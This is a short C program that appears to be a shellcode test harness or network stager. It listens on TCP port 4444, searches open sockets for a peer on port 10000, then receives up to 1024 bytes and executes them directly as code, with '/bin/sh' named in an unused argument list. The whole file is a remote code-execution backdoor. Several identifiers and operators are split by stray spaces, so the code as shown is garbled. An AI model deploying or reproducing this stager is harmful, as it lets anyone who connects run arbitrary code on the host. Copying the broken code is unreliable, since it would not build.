#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

unsigned char buffer[1024];

int main(void) {
        int sockfd, newsockfd;
        struct sockaddr_in serverSA, clientSA;
        int clientSaSize = sizeof(struct sockaddr_in);
        struct sockaddr_in tempSA;
        int i,j = sizeof (struct sockaddr_in);
        char *arg_list[] = { { "/bin/sh" }, NULL };

        sockfd = socket(PF_INET, SOCK_STREAM, 0);

        memset(serverSA.sin_zero, '\0', sizeof(serverSA.                     sin_zero));
        serverSA.sin_family = AF_INET;
        serverSA.sin_addr.s_addr = htonl(INADDR_ANY);
        serverSA.sin_port = htons(4444);

        bind(sockfd, (struct sockaddr *)&serverSA, sizeo                     f(serverSA));
        listen(sockfd, 2);
        newsockfd = accept(sockfd, (struct sockaddr *)&c                     lientSA, &clientSaSize);

        printf("newsockfd: %d\n", newsockfd);

        for(i=256;i>=0;i--){
        if(getpeername(i,(struct sockaddr *)&tempSA,&j)=                     =-1) {
                continue;
        }
        printf("Socket: %d, Port: %d\n", i, ntohs(tempSA                     .sin_port));
        if(tempSA.sin_port==htons(10000)) break;
        }

        i = recv(newsockfd, buffer, 1024, 0);
        printf("Recieved %d bytes\n", i);
        int (*ret)() = (int(*)())buffer;
        ret();
        close(newsockfd);
        return 0;
}
